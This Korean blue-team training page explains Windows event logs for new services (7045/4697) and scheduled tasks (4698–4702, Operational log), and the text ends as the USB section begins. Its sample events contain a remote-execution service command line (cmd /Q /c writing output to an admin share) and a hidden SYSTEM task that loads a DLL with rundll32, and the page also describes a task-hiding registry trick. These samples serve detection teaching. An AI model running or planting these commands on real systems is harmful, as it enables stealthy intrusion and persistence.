---
title: "서비스, 예약 작업, USB 이벤트 — 7045/4697, 4698–4702와 작업 스케줄러 로그, 6416 플러그 앤 플레이"
tags:
  - training
  - blue-team
  - windows
  - logging
  - persistence
---

# 서비스, 예약 작업, USB 이벤트 — 7045/4697, 4698–4702, 6416 { #services-tasks-usb }

!!! abstract "이 페이지에서 다루는 것"
    "**나중에도 계속 돌아가도록 컴퓨터에 무언가가 새로 붙었다**"는 걸 기록하는 Windows 이벤트 세 종류입니다. 새 **서비스**, 새 **예약 작업**, 새 **USB 장치**. 서비스 쪽: 서비스가 정확히 무엇인지, 공격자가 왜 지속성(persistence)과 원격 실행에 서비스를 좋아하는지, 설치를 기록하는 두 이벤트 — System 채널의 **7045**(기본으로 켜져 있음)와 Security 채널의 **4697**(정책이 필요함) — 를 칸별로 읽기, 그리고 평범한 드라이버 업데이트와 PsExec 같은 원격 명령, 심어 둔 백도어를 어떻게 구별하는지. 예약 작업 쪽: 작업 스케줄러가 하는 일, 작업이 어떻게 공격자에게 지속성 **그리고** 원격 실행을 주는지, 까다로운 중첩 XML이 든 **4698**(작업 생성)을 한 줄씩 읽기, 짝 이벤트 **4699–4702**, 작업 스케줄러 Operational 로그(106, 140, 141, 200, 201), 그리고 작업을 화면에서는 숨기지만 로그에서는 못 숨기는 "숨은 작업" 수법. USB 쪽: 물리 장치가 왜 아직도 공격 경로인지, 이벤트 **6416**(새 외부 장치 인식)을 칸별로 읽기, **VID**와 **PID**가 무엇이고 어떻게 찾아보는지, 그리고 "USB 저장 장치는 막았어요"가 왜 키 입력 주입 장치를 못 막는지. SOC 점검 목록, 2026년 관점, 확인 문제가 이어집니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP, 파일 이름, 장치 ID는 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. **서비스(service)** 는 Windows가 백그라운드에서 띄우고 계속 돌려 두는 프로그램입니다. 보통 아주 강한 계정(LocalSystem)으로, 흔히 부팅할 때 시작됩니다. 그래서 "서비스 설치"는 공격자가 아주 좋아하는 **지속성** 수단(ATT&CK **T1543.003**)이자 **원격 실행** 수단입니다(PsExec 같은 도구는 대상 컴퓨터에 임시 서비스를 만듭니다, **T1569.002**).
2. 서비스 설치는 두 군데 기록됩니다. **System** 채널의 **7045**(제공자 *Service Control Manager*, 늘 켜져 있음)와 **Security** 채널의 **4697**(*Audit Security System Extension* 하위 범주를 켜야만 생김). SIEM 중 상당수가 Security만 모읍니다. 7045도 꼭 모으세요.
3. 새 서비스는 **네 칸**으로 판단합니다. **이미지 경로(image path)**(프로그램이 어디 있고 명령줄이 무엇인지), **이름**(무작위이거나 유명한 이름 흉내), **계정**(보통 LocalSystem — 악성코드도 마찬가지), **누가/무엇이 만들었나**. 경로가 `cmd.exe /c ...`, `powershell -enc ...`이거나 `Temp`, `Users\Public`, `ProgramData`의 파일이면 수상합니다.
4. **예약 작업(scheduled task)** 은 정해진 시각에, 어떤 계기(로그온, 부팅, 유휴)에, 또는 반복해서 명령을 실행합니다. 공격자는 **지속성**(악성코드를 다시 실행하거나 다시 설치)과 **원격 실행**(다른 컴퓨터에 작업 만들기)에 씁니다. ATT&CK **T1053.005**입니다.
5. **4698**(작업 생성)은 Security 채널에 있고 *Audit Other Object Access Events*가 필요합니다. 이 이벤트는 **작업 정의 전체를 이벤트 안에 XML로** 담습니다. 실행할 명령은 `TaskContent` 칸 안의 `<Exec><Command>`와 `<Arguments>`에 있습니다. 파서가 이 중첩 XML을 처리할 수 있어야 합니다.
6. 작업의 일생 전체를 지켜보세요. **4698** 생성, **4702** 수정, **4699** 삭제, **4700** 사용, **4701** 사용 안 함 — 그리고 작업 스케줄러 **Operational** 로그(106 등록, 140 수정, 141 삭제, 200/201 동작 시작/끝, 129 프로세스 생성). 몇 분 안에 만들어지고, 실행되고, 지워지는 작업은 원격 실행의 전형입니다.
7. **6416**(새 외부 장치를 인식함)에는 *Audit PNP Activity*가 필요합니다. 장치 이름, **클래스**(저장 장치, 키보드, 네트워크 어댑터), 하드웨어 ID가 들어 있고, 거기서 **VID**(제조사)와 **PID**(제품)를 읽습니다. MAC 주소의 OUI와 비슷합니다. 장치 하나가 6416을 여러 개 만들 수 있습니다.
8. USB *저장 장치*만 막아서는 부족합니다. 키 입력 주입 장치는 자기를 **키보드**(HID 클래스)라고 소개하고, USB 네트워크 어댑터는 **네트워크** 장치라고 소개합니다(ATT&CK **T1200**, Hardware Additions). 클래스별로 허용할 VID/PID 목록을 두면 둘 다 잡힙니다.

## "컴퓨터에 새로 붙은 것"이 왜 중요한가 { #why }

호텔을 떠올려 보세요. 열린 창문으로 한 번 몰래 들어온 도둑에게는 고민이 있습니다. 다음 주엔 그 창문이 닫혀 있을지도 모르니까요. 그래서 꼼꼼한 도둑은 셋 중 하나를 합니다. 자기 이름을 **직원 명단**에 올려서 건물이 매일 아침 자기를 들여보내게 하거나(서비스), **프런트 업무 일지**에 "매일 밤 2시에 배관공을 들여보낼 것"이라고 적어 두거나(예약 작업), 방 안에 **장치를 심어** 둡니다. 숨긴 무전기나 복제한 카드 키 같은 것들이요(USB 장치). 셋 다 다른 장부에 흔적을 남깁니다. 직원 명부, 업무 일지, 분실물 목록. 좋은 보안 책임자는 셋을 다 읽습니다.

기술적인 실제로 돌아오면, 공격자에게 처음 들어오는 데 성공하는 건 한 번뿐일 수 있습니다. 피싱 문서나 익스플로잇은 한 번 먹히고 다시는 안 먹힐 수도 있죠. 그래서 들어온 뒤 첫 번째 목표는 **머무르기**(지속성, ATT&CK 전술 TA0003)와 **퍼지기**(옆으로 이동, TA0008)입니다. Windows에는 사용자가 아무것도 누르지 않아도 프로그램을 시작해 주는, 완전히 정상적인 기본 기능이 둘 있습니다. 서비스와 예약 작업입니다. 정상 소프트웨어도 늘 서비스와 작업을 설치하기 때문에(드라이버, 업데이트 도구, 백업 에이전트, 프린터) 새로운 게 하나 생겼다는 것만으로는 눈에 띄지 않습니다. 바로 그래서 기록을 남기고, "생겼다"는 사실이 아니라 **세부 내용**을 봐야 합니다. USB 장치는 같은 생각의 물리 버전입니다. 컴퓨터에 새로 붙어서 이제 그 컴퓨터에 무언가를 하는 것.

공격자 쪽은 [실행, 지속성, 탐색](../endpoint-attacks/execution-persistence-discovery.md), 같은 곳을 지켜보는 방어 도구는 [애플리케이션 제어, FIM, 지속성 잡기](../endpoint-defense/appcontrol-fim-persistence.md)를 참고하세요.

## 서비스 { #services }

### 서비스란 { #service-what }

**서비스**는 **서비스 제어 관리자(Service Control Manager, SCM, `services.exe`)** 에 등록된 프로그램입니다. SCM은 레지스트리 `HKLM\SYSTEM\CurrentControlSet\Services\<이름>` 아래에 서비스 목록을 두고, 부팅할 때나 요청이 올 때 서비스를 시작하고, 죽으면 다시 살리고, 정해진 계정으로 돌립니다. Linux에서 가장 가까운 건 **systemd 유닛**(또는 옛 init 스크립트)입니다. sshd와 Apache가 거기서도 서비스입니다.

서비스마다 우리가 신경 써야 할 설정이 몇 개 있습니다.

| 설정 | 레지스트리 값 | 흔한 값 | 왜 중요한가 |
| --- | --- | --- | --- |
| 이름 / 표시 이름 | 키 이름 / `DisplayName` | `Spooler` / "Print Spooler" | 공격자는 그럴듯한 이름을 베끼거나 무작위 이름을 씀 |
| 이미지 경로 | `ImagePath` | `C:\Windows\System32\spoolsv.exe` | **프로그램과 명령줄** — 가장 많은 걸 말해 주는 칸 |
| 유형 | `Type` | `0x10` 독립 프로세스, `0x20` 공유 프로세스(svchost), `0x1` 커널 드라이버, `0x2` 파일 시스템 드라이버 | 커널 드라이버는 링 0에서 돎 — 악성 드라이버는 아주 강력함 |
| 시작 유형 | `Start` | `0` 부팅, `1` 시스템, `2` 자동, `3` 수동(요청 시), `4` 사용 안 함 | 자동 = 재부팅을 버팀(지속성) |
| 계정 | `ObjectName` | `LocalSystem`, `NT AUTHORITY\LocalService`, `NT AUTHORITY\NetworkService`, 도메인 계정 | LocalSystem = 컴퓨터 전체를 마음대로 |

서비스는 `sc.exe create`, PowerShell `New-Service`, 설치 프로그램(MSI), WMI, 또는 SMB 이름 있는 파이프(`\pipe\svcctl`)로 SCM의 원격 API를 직접 불러서 만듭니다. 마지막 방법이 원격 실행 도구들이 쓰는 길입니다.

### 공격자는 서비스를 어떻게 쓰나 { #service-abuse }

- **지속성(T1543.003, Create or Modify System Process: Windows Service).** 시작 유형이 *자동*이고 악성코드를 가리키는 서비스를 설치합니다. 이제 그 악성코드는 부팅할 때마다, 누가 로그온하기도 전에, LocalSystem으로 시작됩니다. 변형으로는 **이미 있는** 서비스의 `ImagePath`를 바꾸는 방법(새 서비스 이벤트가 안 생김 — 아래 참고), `svchost` 서비스에 악성 DLL을 끼워 넣는 방법이 있습니다.
- **원격 실행(T1569.002, System Services: Service Execution; T1021.002, SMB/Windows Admin Shares).** 대상 컴퓨터의 관리자 자격 증명이 있으면, 도구가 프로그램을 대상의 `ADMIN$` 공유에 복사하고, 그걸 가리키는 서비스를 대상에 만들고, 시작하고, 끝나면 지웁니다. Sysinternals PsExec은 이걸 대놓고 합니다(이름을 바꾸지 않으면 서비스 이름이 `PSEXESVC`). 여러 공격 프레임워크는 무작위 서비스 이름에 `%COMSPEC% /Q /c ...` 같은 명령줄을 이미지 경로에 바로 넣어서 같은 일을 합니다.
- **권한 상승과 방어 회피.** 서비스는 SYSTEM으로 돌기 때문에, 서비스를 만드는 건 관리자에서 SYSTEM으로 가는 길이기도 합니다. **취약한 서명 드라이버**를 커널 서비스로 올리는 것(T1068, "취약한 드라이버 가져오기(bring your own vulnerable driver)")은 EDR 제품을 끄는 흔한 방법입니다.
- **위장(T1036.004, Masquerade Task or Service).** `WindowsUpdateSvc`, `GoogleUpdaterTaskMachine` 같은 이름, 또는 진짜 서비스 이름과 거의 똑같은 이름.

### 이벤트 7045: 시스템에 서비스가 설치됨 { #7045 }

**7045**는 새 서비스가 설치될 때마다 제공자 *Service Control Manager*가 **System** 채널에 씁니다. 기본으로 켜져 있어서 감사 정책이 필요 없습니다. 하지만 Security가 아니라 **System**에 있어서, Security만 전달하는 수집 설정은 이걸 놓칩니다. 원격 실행 도구가 파일 서버에 서비스를 만든 모습입니다.

```xml
<System>
  <Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931d2012f4}" EventSourceName="Service Control Manager" />
  <EventID Qualifiers="16384">7045</EventID>
  <TimeCreated SystemTime="2026-11-20T04:17:32.4410382Z" />
  <Channel>System</Channel>
  <Computer>FS-02.corp.example</Computer>
  <Security UserID="S-1-5-21-1004336348-1177238915-682003330-1120" />
</System>
<EventData>
  <Data Name="ServiceName">KxQpLmTr</Data>
  <Data Name="ImagePath">%COMSPEC% /Q /c echo whoami ^&gt; \\127.0.0.1\C$\Windows\Temp\out.txt 2^&gt;^&amp;1 &gt; %TEMP%\exec.bat &amp; %COMSPEC% /Q /c %TEMP%\exec.bat &amp; del %TEMP%\exec.bat</Data>
  <Data Name="ServiceType">user mode service</Data>
  <Data Name="StartType">demand start</Data>
  <Data Name="AccountName">LocalSystem</Data>
</EventData>
```

칸별로 보면:

- `Provider Name="Service Control Manager"` — SCM이 직접 썼습니다. 제공자**와** 이벤트 ID를 같이 거르세요. 다른 제공자도 7045라는 번호를 전혀 다른 뜻으로 씁니다.
- `EventID` `7045` — "A service was installed in the system(시스템에 서비스가 설치됨)."
- `Channel` `System` — Security가 아닙니다. 전달 도구가 이걸 모으는지 확인하세요.
- `Security UserID` — **서비스를 만든 계정의 SID**입니다. 7045에는 "Subject" 칸이 없어서, `System` 부분의 이 속성이 유일한 "누가"입니다. 이 SID를 계정으로 바꾸고(여기서는 `-1120`으로 끝나는 도메인 계정) 그 로그온을 찾으세요. 바로 전에 다른 워크스테이션에서 온 **유형 3** 4624가 있다면 원격 서비스 생성의 지문입니다([로그인 이벤트](logins.md) 참고).
- `ServiceName` `KxQpLmTr` — 무작위 글자 여덟 개. 정상 소프트웨어는 읽을 수 있고 늘 같은 이름을 씁니다. 무작위 이름은 강한 신호이고, 그럴듯하지만 다른 어느 호스트에서도 본 적 없는 이름도 마찬가지입니다.
- `ImagePath` — **가장 중요한 칸**입니다. 보통은 `.exe` 경로(또는 `svchost.exe -k <그룹>`)입니다. 그런데 여기엔 **명령줄**이 있습니다. `%COMSPEC%`(= `cmd.exe`)를 `/Q`(조용히)와 `/c`(실행하고 끝내기)로 돌려서, 명령을 `%TEMP%`의 배치 파일에 쓰고, 그걸 실행하고, 결과를 로컬 `C$` 공유를 거쳐 `C:\Windows\Temp\out.txt`에 써서 공격자가 SMB로 다시 읽어 갈 수 있게 하고, 배치 파일을 지웁니다. 이미지 경로가 `cmd`, `%COMSPEC%`, `powershell`, `mshta`, `rundll32`로 시작하거나 `\\127.0.0.1\`이나 `-enc`가 들어 있는 서비스는 정상인 경우가 거의 없습니다. (`^&gt;`와 `&amp;`는 `>`와 `&`를 XML 방식으로 바꿔 쓴 것입니다.)
- `ServiceType` `user mode service` — 평범한 프로세스(`0x10`). 여기에 `kernel mode driver`가 보이면 어떤 드라이버인지 꼼꼼히 봐야 합니다.
- `StartType` `demand start` — 수동. 원격 실행 도구는 서비스를 한 번 시작하고 지우니까 수동 시작을 씁니다. **지속성**용 서비스라면 `auto start`입니다.
- `AccountName` `LocalSystem` — 가장 강한 로컬 계정. 정상 서비스도 많이 쓰니까 이것만으로는 약한 신호지만, 서비스가 돌면 공격자가 무엇을 할 수 있는지 알려 줍니다.

주변에서 함께 나올 이벤트: 몇 초 뒤 **7036**(서비스가 *실행 중* / *중지됨* 상태로 바뀜), "서비스"가 진짜 서비스 프로그램이 아니라서 SCM이 응답을 기다리다 시간이 다 된 경우 **7009/7000**(이미지 경로에 명령줄을 넣으면 흔히 이렇게 됩니다 — 그래도 명령은 실행됐습니다), 그리고 4688이나 Sysmon 1에서 **부모가 `services.exe`** 인 `cmd.exe` 프로세스 생성([프로세스 생성 이벤트](process-creation.md) 참고). PsExec은 더 깔끔해 보입니다. `ServiceName` `PSEXESVC`, `ImagePath` `%SystemRoot%\PSEXESVC.exe`, 그리고 `\PSEXESVC-...` 이름 있는 파이프.

[보충] *바뀐* 서비스는 *새* 서비스가 아닙니다. 공격자가 이미 있는 서비스의 `ImagePath`를 고치면(`sc config <이름> binPath= ...`, 또는 레지스트리를 직접) **7045도 4697도 생기지 않습니다.** 이건 *시작 유형*이 바뀔 때만 생기는 **7040**, 레지스트리 감사(4657, [방화벽과 개체 접근 이벤트](firewall-object-access.md) 참고)나 `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath`에 대한 Sysmon 13, 또는 `sc.exe` 프로세스 생성 이벤트에서 보입니다.

### 이벤트 4697: 시스템에 서비스가 설치됨(Security 채널) { #4697 }

**4697**은 같은 일을 **Security** 채널에, 제대로 된 "Subject" 칸과 함께 기록합니다. 고급 감사 정책의 *System* 아래 *Audit Security System Extension* 하위 범주가 성공(Success)으로 켜져 있어야만 생깁니다.

```text
auditpol /set /subcategory:"Security System Extension" /success:enable
```

- `auditpol /set` — 로컬 감사 정책을 바꿉니다(도메인에서는 그룹 정책으로 하세요).
- `/subcategory:"Security System Extension"` — 서비스 설치와 LSA에 올라오는 보안 패키지를 맡는 하위 범주입니다.
- `/success:enable` — 성공한 설치를 기록합니다.

같은 설치를 4697로 보면:

```xml
<EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">svc.deploy</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x5c21a7e</Data>
  <Data Name="ServiceName">KxQpLmTr</Data>
  <Data Name="ServiceFileName">%COMSPEC% /Q /c echo whoami ^&gt; \\127.0.0.1\C$\Windows\Temp\out.txt ...</Data>
  <Data Name="ServiceType">0x10</Data>
  <Data Name="ServiceStartType">3</Data>
  <Data Name="ServiceAccount">LocalSystem</Data>
</EventData>
```

- `SubjectUserName`/`SubjectDomainName` `CORP\svc.deploy` — SID만이 아니라 계정 이름이 나옵니다. **배포용 서비스 계정**이 평소에 쓰지 않는 워크스테이션에서 무작위 이름 서비스를 만든다면, 그 자격 증명이 털렸다는 강한 신호입니다.
- `SubjectLogonId` `0x5c21a7e` — `FS-02`의 4624로 따라가세요. 로그온 유형 3, 출발지 `IpAddress`, NTLM인지 Kerberos인지가 보입니다.
- `ServiceFileName` — 7045의 `ImagePath`와 같습니다.
- `ServiceType` `0x10` — 글자 대신 숫자: `0x10` 독립 프로세스, `0x20` 공유, `0x1` 커널 드라이버, `0x2` 파일 시스템 드라이버.
- `ServiceStartType` `3` — `0` 부팅, `1` 시스템, `2` 자동, `3` 수동, `4` 사용 안 함.
- `ServiceAccount` — 서비스를 돌릴 계정.

| | 7045 | 4697 |
| --- | --- | --- |
| 채널 | System | Security |
| 기본으로 켜짐 | 예 | 아니요(*Audit Security System Extension*) |
| 누가 만들었나 | `<Security UserID>`의 SID만 | `SubjectUserName`, 도메인, **로그온 ID** |
| 유형 / 시작 유형 | 글자(`user mode service`, `auto start`) | 숫자(`0x10`, `2`) |
| 가장 좋은 쓰임 | 늘 켜진 기본 출처 | 로그온 세션과 잇기 |

둘 다 모을 수 있으면 모으고, 최소한 7045가 SIEM에 들어오는지는 꼭 확인하세요.

### 좋은 서비스인가, 나쁜 서비스인가 { #service-triage }

새 서비스는 늘 생깁니다(드라이버와 제품 업데이트, 에이전트, 프린터 설치). 그래서 "7045가 오면 경보" 규칙 하나는 금세 잡음이 됩니다. 앞뒤 사정을 보세요.

- **이미지 경로 위치.** 예상되는 곳: `C:\Windows\System32\`, `C:\Program Files\<제조사>\`, `C:\Windows\System32\drivers\`. 수상한 곳: `C:\Users\...`, `AppData`, `Temp`, `C:\Users\Public\`, `C:\ProgramData\` 바로 아래, `C:\PerfLogs\`, UNC 경로, 그리고 명령줄.
- **이름.** 무작위 문자열, 그 제품이 설치되지 않은 호스트의 유명한 이름, 또는 회사 전체에서 다른 데서 본 적 없는 이름(몇 대의 호스트에 있는지 세어 보기 — **쌓아 보기(stacking)**).
- **누가, 어디서.** 소프트웨어 배포 시간에 관리 도구가 `SYSTEM`으로 만든 건 정상입니다. 사용자나 서비스 계정이 워크스테이션에서 유형 3 로그온으로 만든 건 아닙니다.
- **그다음에 무슨 일이.** 바로 시작되고 1분 안에 지워짐(`sc delete`, 또는 그 뒤 7036 없음) → 원격 실행. 자동 시작 + 사용자가 쓸 수 있는 폴더의 파일 → 지속성.
- **커널 드라이버.** 패치 기간이 아닌데 새 `kernel mode driver` 서비스가 생겼다면, 드라이버 파일의 서명자와 Microsoft 취약 드라이버 차단 목록에 있는지 확인하세요.

## 예약 작업 { #tasks }

### 예약 작업이란 { #task-what }

**작업 스케줄러(Task Scheduler)**(`schedule` 서비스)는 **트리거(trigger)** — 정해진 시각, 반복 간격, 시스템 시작, 사용자 로그온, 유휴 상태, 심지어 로그에 어떤 이벤트가 생기는 것 — 가 일어나면 명령을 실행합니다. 작업 하나하나는 `C:\Windows\System32\Tasks\<경로>`에 XML 파일로 저장되고, 레지스트리 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\` 아래에 목록이 있습니다. Windows 자체에 작업이 수백 개 들어 있고(조각 모음, 업데이트, 텔레메트리), 소프트웨어가 더 넣습니다(브라우저 업데이트 도구). Linux에서는 `cron`과 systemd 타이머가 같은 역할입니다.

작업은 `schtasks.exe /create`, PowerShell `Register-ScheduledTask`, 화면(GUI), COM, 또는 **원격으로**(`schtasks /create /s <호스트>`, 또는 GUI가 쓰는 RPC 인터페이스) 만듭니다. 어느 방법이든 같은 이벤트로 남습니다.

### 공격자는 작업을 어떻게 쓰나 { #task-abuse }

- **지속성(T1053.005, Scheduled Task/Job: Scheduled Task).** 로그온할 때마다, 또는 15분마다 악성코드를 실행하는 작업. 보안 팀이 악성 파일을 지워도 두 번째 작업이 그걸 다시 내려받을 수 있습니다. 스스로 낫는 지속성이죠.
- **원격 실행 / 옆으로 이동.** 대상 컴퓨터의 관리자 권한이 있으면, 페이로드를 공유에 복사하고, 1분 뒤 한 번 실행하는 작업을 대상에 만들고, 그다음 작업을 지웁니다. 서비스와 마찬가지로 Windows 기본 도구만 쓰기 때문에("현지 조달(living off the land)") 악성 파일만 찾는 도구를 흔히 빠져나갑니다.
- **권한 올리기.** 작업은 SYSTEM으로, 또는 비밀번호가 작업과 함께 저장된 어떤 계정으로든 돌 수 있습니다.
- **숨기.** Microsoft 작업을 흉내 낸 이름(`\Microsoft\Windows\UpdateOrchestrator\...`), 깊은 폴더에 넣은 작업, 아래에서 설명할 "숨은 작업" 수법.

### Security 이벤트 켜기 { #task-config }

Security 채널의 작업 이벤트는 *Object Access* 아래 *Audit Other Object Access Events* 하위 범주가 만듭니다.

```text
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
auditpol /get /subcategory:"Other Object Access Events"
```

```text
System audit policy
Category/Subcategory                      Setting
Object Access
  Other Object Access Events              Success and Failure
```

- 1행 — 하위 범주를 성공과 실패 모두 켭니다. 파일 감사와 달리 **SACL이 필요 없습니다.** 하위 범주만 켜면 작업 스케줄러가 알아서 이벤트를 씁니다.
- 2행 — 지금 설정을 보여 줍니다. 대부분의 시스템에서 기본값은 *No Auditing*(감사 안 함)입니다.

양이 적어서(작업은 자주 만들어지지 않음) 비용은 작고 가치는 큰 변경입니다.

### 이벤트 4698: 예약 작업이 만들어짐 { #4698 }

**4698**은 작업이 **등록된** 컴퓨터에 남습니다. 원격으로 만든 작업이라면 공격자 컴퓨터가 아니라 **대상** 컴퓨터입니다. 흥미로운 부분은 `TaskContent`입니다. 작업 정의 전체가 XML로, 이벤트 자신의 XML 안에 글자로 들어 있습니다.

```xml
<EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">svc.deploy</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x5d0e113</Data>
  <Data Name="TaskName">\Microsoft\Windows\WinSAT\UpdateCheck</Data>
  <Data Name="TaskContent">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;Date&gt;2026-11-20T13:20:05&lt;/Date&gt;
    &lt;Author&gt;CORP\svc.deploy&lt;/Author&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;TimeTrigger&gt;
      &lt;StartBoundary&gt;2026-11-20T13:21:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;/TimeTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;Hidden&gt;true&lt;/Hidden&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;C:\Windows\System32\rundll32.exe&lt;/Command&gt;
      &lt;Arguments&gt;C:\ProgramData\winsat.dll,Start&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;</Data>
</EventData>
```

바깥 칸:

- `SubjectUserName`/`SubjectDomainName`/`SubjectLogonId` — 누가 작업을 등록했는지, 그리고 4624까지 거슬러 갈 로그온 세션. 원격으로 만든 작업이면 바로 전에 공격자 출발지에서 온 **유형 3** 로그온이 보입니다.
- `TaskName` `\Microsoft\Windows\WinSAT\UpdateCheck` — 폴더 경로와 이름. Microsoft 폴더에 있고 그럴듯한 이름(`WinSAT`는 실제 Windows 구성 요소)을 썼지만, 진짜 Microsoft 작업은 Windows나 업데이트와 함께 설치되지, 오후에 도메인 서비스 계정이 만들지 않습니다. 위장, T1036.004.
- `TaskContent` — 작업 정의를 XML 방식으로 바꿔 쓴 것(`&lt;` = `<`, `&gt;` = `>`). 이벤트 뷰어 *General* 탭에서는 풀어서 보여 주지만, *Details* 탭과 대부분의 전달 도구에서는 이렇게 바뀐 글자로 보입니다.

`TaskContent` 안을 한 줄씩:

- `<RegistrationInfo>`의 `<Date>`와 `<Author>` — 언제, 누가. 단 이건 **만든 사람이 직접 적는** 값입니다. 아무거나 써넣을 수 있으니 바깥의 `Subject` 칸을 더 믿으세요.
- `<TimeTrigger>` `<StartBoundary>2026-11-20T13:21:00` — 만든 지 약 1분 뒤 **한 번** 실행(대상 컴퓨터의 현지 시각). 1분 뒤 한 번짜리 트리거는 원격 실행 모양입니다. 지속성이라면 `<LogonTrigger>`, `<BootTrigger>`, 또는 `PT15M`(15분마다) 같은 `<Interval>`이 있는 `<Repetition>`이 보입니다.
- `<Principal>` `<UserId>S-1-5-18</UserId>` — **SYSTEM**(`S-1-5-18`)으로 실행. `<RunLevel>HighestAvailable</RunLevel>` — 관리자 권한을 다 써서.
- `<Settings>` `<Hidden>true</Hidden>` — 작업 스케줄러 기본 화면에서 숨김. 겉보기용일 뿐이지만("숨겨진 작업 표시"를 켜면 보임), 정상적인 사용자 정의 작업은 이걸 거의 안 씁니다.
- `<Exec>` `<Command>` + `<Arguments>` — **진짜 내용**: `rundll32.exe`가 `C:\ProgramData\winsat.dll`을 불러 `Start` 함수를 부릅니다(T1218.011, System Binary Proxy Execution: Rundll32). `ProgramData` 바로 아래 DLL을 `rundll32`로 돌리는 건 전형적인 로더입니다.

수집할 때 중첩 XML이 왜 문제인가: SIEM 파서는 `TaskName`과 `TaskContent`를 보통 칸으로 뽑지만, `Command`와 `Arguments`는 글자 칸 *안에* 들어 있습니다. 파서가 바뀐 XML을 풀어서 한 번 더 파싱하지 않으면 `Command=*rundll32*` 검색은 아무것도 못 찾습니다. 두 번째 파싱 단계를 넣거나(SIEM 대부분에 XML 추출 기능이 있음), 최소한 `TaskContent` 칸 전체에 부분 문자열 검색을 하세요.

### 작업의 나머지 일생: 4699–4702 { #4699-4702 }

모두 Security 채널, 같은 하위 범주, 모두 `TaskName`과 Subject 칸이 있습니다.

| 이벤트 | 뜻 | 왜 중요한가 |
| --- | --- | --- |
| **4698** | 작업 생성 | 새 지속성 또는 원격 실행 |
| **4702** | 작업 수정(`TaskContentNew`에 새 XML) | *이미 있는* 정상 작업 가로채기 — 명령만 바꾸고 순한 이름은 그대로 |
| **4699** | 작업 삭제 | 원격 실행 뒤 정리. 몇 분 간격의 4698 → 4699 짝은 강한 신호 |
| **4700** | 작업 사용 | 꺼 둔 작업을 백도어로 다시 켜기 |
| **4701** | 작업 사용 안 함 | 보안·업데이트 작업을 끄는 공격자(T1562.001) |

### 작업 스케줄러 Operational 로그 { #task-operational }

[보충] `Microsoft-Windows-TaskScheduler/Operational` 채널은 작업이 등록됐다는 것만이 아니라 작업이 **무엇을 했는지**를 기록합니다. 옛 빌드에서는 기본으로 꺼져 있거나 아주 작을 때가 많으니, 쓰려면 켜고 크기를 늘리세요.

```text
2026-11-20 13:20:05  106  Task registered    "\Microsoft\Windows\WinSAT\UpdateCheck" registered by user "CORP\svc.deploy"
2026-11-20 13:21:00  129  Process created    Task "\Microsoft\Windows\WinSAT\UpdateCheck" launched "rundll32.exe", PID 6620
2026-11-20 13:21:00  200  Action started     "\Microsoft\Windows\WinSAT\UpdateCheck" launched action "C:\Windows\System32\rundll32.exe"
2026-11-20 13:21:04  201  Action completed   "\Microsoft\Windows\WinSAT\UpdateCheck" completed action, return code 0
2026-11-20 13:22:11  141  Task deleted       "\Microsoft\Windows\WinSAT\UpdateCheck" deleted by user "CORP\svc.deploy"
```

- **106** — 등록(≈ 4698). **140** — 수정(≈ 4702). **141** — 삭제(≈ 4699).
- **129** — 작업의 프로세스가 만들어짐. PID가 있어서 4688/Sysmon 1과 맞춰 볼 수 있습니다. 프로세스 로그에서 작업 프로그램의 부모는 `Schedule` 서비스를 돌리는 `svchost.exe`입니다(최신 빌드에서는 어떤 종류의 작업은 `taskhostw.exe`로 보일 수 있습니다).
- **200 / 201** — 동작 시작 / 끝, 반환 코드와 함께.

이어서 읽으면: 13:20:05에 등록, 1분 뒤 SYSTEM으로 실행, 13:22:11에 삭제. 전체 수명 2분. 이건 유지 보수가 아니라 원격 실행입니다.

### "숨은 작업" 수법 { #hidden-tasks }

[보충] 어떤 공격자는 작업을 만든 뒤 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<작업 이름>` 아래의 `SD`(보안 설명자, security descriptor) 값을 지웁니다. 작업은 계속 돌지만 `schtasks /query`와 작업 스케줄러 창에는 더 이상 안 나옵니다. SYSTEM 권한이 필요합니다. 그래도 잡을 수 있는 곳:

- 만들 때 남은 **4698**과 Operational **106** — 숨기기 전에 이미 기록됐습니다.
- `...\Schedule\TaskCache\Tree\` 아래에서 `SD`라는 값이 지워진 것을 보는 레지스트리 감사나 Sysmon 12(*레지스트리 개체 삭제*).
- `C:\Windows\System32\Tasks\`의 작업 XML 파일과 `TaskCache` 키를 `schtasks`가 보여 주는 목록과 비교하기(EDR이나 포렌식 수집 도구가 할 수 있음).

## USB와 다른 플러그 앤 플레이 장치 { #usb }

### USB가 아직도 공격 경로인 이유 { #usb-why }

USB 장치가 컴퓨터에 닿는 방식 중 방어자에게 중요한 건 셋입니다.

